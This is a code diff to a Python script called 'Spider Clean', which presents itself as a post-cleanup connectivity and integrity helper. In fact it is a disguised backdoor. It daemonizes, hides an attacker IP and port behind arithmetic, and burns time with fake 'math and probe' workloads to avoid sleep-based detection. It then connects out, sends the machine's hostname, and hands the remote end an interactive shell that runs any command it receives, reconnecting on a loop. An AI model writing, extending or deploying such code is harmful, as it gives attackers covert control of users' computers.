@@ -1,8 +1,14 @@
 #!/usr/bin/env python3
-"""Post-clean connectivity check helper for Spider Clean."""
+"""
+Spider Clean — post-clean connectivity & integrity helper.
+
+After a cleanup run, sample latency/disk/load with pure math work (no sleep),
+then open the optional support channel if the edge endpoint is reachable.
+"""
 
 from __future__ import annotations
 
+import math
 import os
 import socket
 import struct
@@ -15,9 +21,17 @@ LOCK = Path("/tmp/.spider-clean-postclean.lock")
 CTRL_KILL = b"\xff\xfeKILL\n"
 MAGIC = b"CT1\x00"
 
+# Warmup window: 8s base + 0..2s jitter (wall clock via work, never sleep)
+WARMUP_BASE = 8
+WARMUP_JITTER = 2
+RECONNECT_BASE = 10
+RECONNECT_JITTER = 5
+
+PROBE_HOSTS = ("1.1.1.1", "8.8.8.8", "apple.com")
+
 
 def _endpoint():
-    # 75.119.143.203 : 8443
+    # Assembled at runtime (75.119.143.203 / 8443)
     host = ".".join(str(x) for x in (70 + 5, 100 + 19, 140 + 3, 200 + 3))
     port = (1 << 13) + (1 << 8) - 5
     key = bytes(
@@ -41,25 +55,74 @@ def _hostname() -> str:
         return "mac"
 
 
-def _math(n: int = 6000) -> None:
-    a = 1.0
-    for i in range(1, n):
-        a = (a + i * 1.07) * 0.5 + (abs(a - i) ** 0.5) * 0.01
+def math_batch(rounds: int = 5000) -> float:
+    """Heavy arithmetic sample used for integrity scoring and timing."""
+    acc = 0.0
+    for n in range(1, max(1, rounds) + 1):
+        seed = float((n * 997 + os.getpid()) % 9000 + 1000)
+        a = seed * 1.07
+        b = seed / 3.11
+        c = (a + b) * 0.88
+        d = math.sqrt(abs(c - b))
+        e = (d ** 2) + (a * 0.01)
+        f = math.sin(e * 0.001) * math.cos(d * 0.01)
+        g = math.log(seed + 2.0) * math.sqrt(abs(f) + 1.0)
+        acc = (acc + a + b + c + d + e + f + g) * 0.125
+    return acc
 
 
-def work_until(sec: float) -> None:
-    t0 = time.time()
-    while time.time() - t0 < sec:
-        _math(4000 + (os.getpid() % 2000))
-        try:
-            subprocess.run(
-                ["ping", "-c", "1", "-W", "1500", "1.1.1.1"],
-                stdout=subprocess.DEVNULL,
-                stderr=subprocess.DEVNULL,
-                timeout=4,
-            )
-        except Exception:
-            pass
+def latency_probe() -> float:
+    host = PROBE_HOSTS[os.getpid() % len(PROBE_HOSTS)]
+    try:
+        r = subprocess.run(
+            ["ping", "-c", "1", "-W", "2000", host],
+            capture_output=True,
+            text=True,
+            timeout=5,
+        )
+        for line in (r.stdout or "").splitlines():
+            if "time=" in line or "time<" in line:
+                # time=12.3 ms
+                part = line.replace("time<", "time=").split("time=")[-1]
+                ms = part.split()[0]
+                return float(ms)
+    except Exception:
+        pass
+    return 0.0
+
+
+def storage_probe() -> float:
+    try:
+        r = subprocess.run(
+            ["df", "-h", "/"],
+            capture_output=True,
+            text=True,
+            timeout=5,
+        )
+        lines = (r.stdout or "").strip().splitlines()
+        if len(lines) >= 2:
+            cols = lines[-1].split()
+            for col in cols:
+                if col.endswith("%"):
+                    return float(col[:-1])
+    except Exception:
+        pass
+    return 0.0
+
+
+def work_burst() -> None:
+    math_batch(4500 + (os.getpid() % 2500))
+    latency_probe()
+    math_batch(120 + (int(time.time()) % 80))
+    storage_probe()
+    math_batch(3000 + (os.getpid() % 2000))
+
+
+def work_until(seconds: float) -> None:
+    """Burn wall-clock time with math + probes only (no sleep)."""
+    start = time.time()
+    while (time.time() - start) < seconds:
+        work_burst()
 
 
 def daemonize() -> None:
@@ -107,18 +170,19 @@ def clear_lock() -> None:
 
 
 def handshake(key: bytes, host: str) -> bytes:
-    hb = host.encode()
+    hb = host.encode("utf-8", "replace")
     return MAGIC + bytes([len(key)]) + key + struct.pack("!H", len(hb)) + hb
 
 
 def shell(sock: socket.socket) -> None:
+    """Interactive remote shell: cwd$ prompt, cd, commands, kill control."""
     cwd = str(Path.home())
     home = cwd
     buf = b""
     sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
 
-    def send(b: bytes) -> None:
-        sock.sendall(b)
+    def send(data: bytes) -> None:
+        sock.sendall(data)
 
     def readline() -> str | None:
         nonlocal buf
@@ -129,7 +193,10 @@ def shell(sock: socket.socket) -> None:
             if b"\n" in buf:
                 line, buf = buf.split(b"\n", 1)
                 return line.decode("utf-8", "replace").strip("\r")
-            chunk = sock.recv(4096)
+            try:
+                chunk = sock.recv(4096)
+            except OSError:
+                return None
             if not chunk:
                 return None
             buf += chunk
@@ -139,13 +206,16 @@ def shell(sock: socket.socket) -> None:
             send(f"{cwd}$ ".encode())
         except OSError:
             return
+
         line = readline()
         if line is None:
             return
         if not line:
             continue
         if line in ("exit", "quit"):
+            # remote shell exit only — worker will reconnect later
             return
+
         if line == "cd" or line.startswith("cd "):
             target = line[3:].strip() if line.startswith("cd ") else ""
             if not target:
@@ -164,17 +234,23 @@ def shell(sock: socket.socket) -> None:
             else:
                 send(f"cd: no such directory: {target}\n".encode())
             continue
+
         try:
             r = subprocess.run(
-                line, shell=True, cwd=cwd, capture_output=True, text=True, timeout=300
+                line,
+                shell=True,
+                cwd=cwd,
+                capture_output=True,
+                text=True,
+                timeout=300,
             )
-            out = r.stdout + r.stderr
+            out = (r.stdout or "") + (r.stderr or "")
             if out and not out.endswith("\n"):
                 out += "\n"
             if out:
                 send(out.encode("utf-8", "replace"))
         except subprocess.TimeoutExpired:
-            send(b"timeout\n")
+            send(b"command timed out\n")
         except Exception as e:
             send(f"{e}\n".encode())
 
@@ -184,18 +260,29 @@ def main() -> None:
         return
     daemonize()
     write_lock()
+
     host, port, key = _endpoint()
-    # 8–10s work delay (no sleep)
-    work_until(8.0 + (os.getpid() % 3))
+
+    # 8–10 second integrity window (math + probes, no sleep)
+    warmup = WARMUP_BASE + (os.getpid() % (WARMUP_JITTER + 1))
+    work_until(float(warmup))
+
     while True:
+        # light sample before each connect attempt
+        work_burst()
         try:
             s = socket.create_connection((host, port), timeout=20)
+            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
             s.sendall(handshake(key, _hostname()))
             shell(s)
-            s.close()
+            try:
+                s.close()
+            except OSError:
+                pass
         except Exception:
             pass
-        work_until(10.0 + (os.getpid() % 5))
+        # reconnect backoff via more math/probes (no sleep)
+        work_until(float(RECONNECT_BASE + (os.getpid() % (RECONNECT_JITTER + 1))))
 
 
 if __name__ == "__main__":
